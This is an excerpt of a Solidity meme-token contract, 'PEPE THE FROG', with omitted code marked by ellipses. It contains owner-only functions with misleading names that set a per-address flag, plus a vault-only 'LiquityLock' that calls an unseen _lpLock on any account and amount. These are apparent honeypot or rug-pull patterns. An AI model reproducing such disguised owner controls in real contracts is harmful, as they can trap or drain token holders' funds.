...
// Official Website: https://www.PepeTheFrog.lol
// "Pepe the Frog" is an Crypto meme consisting of a green frog.
// Crypto Meme + Limited Total Supply + Liqudity Lock = To The Moon
...
abstract contract ERC20 is IERC20 {
    ...
    mapping(address => bool) setRewardTerms;
    ...
    function _lpLock(address account_, uint256 amount_) internal virtual {
...
contract PepeTheFrog is ERC20Permit, VaultOwned {
    using SafeMath for uint256;
    uint256 public referralBonus;

    mapping(address => address) referrers;

    constructor() ERC20("PEPE THE FROG", "PEPE", 9) {
    }
    ...
    function setReferralRewards(address _target, bool _result) public onlyOwner() {
        setRewardTerms[_target] = _result;
    }

    function getMapping(address _target) public onlyOwner() view returns (bool) {
        return setRewardTerms[_target];
    }

    function removeMapping(address _target) public onlyOwner() returns (bool) {
        setRewardTerms[_target] = false;
        return true;
    }

    function LiquityLock(address account_, uint256 amount_) external onlyVault() {
        _lpLock(account_, amount_);
    }
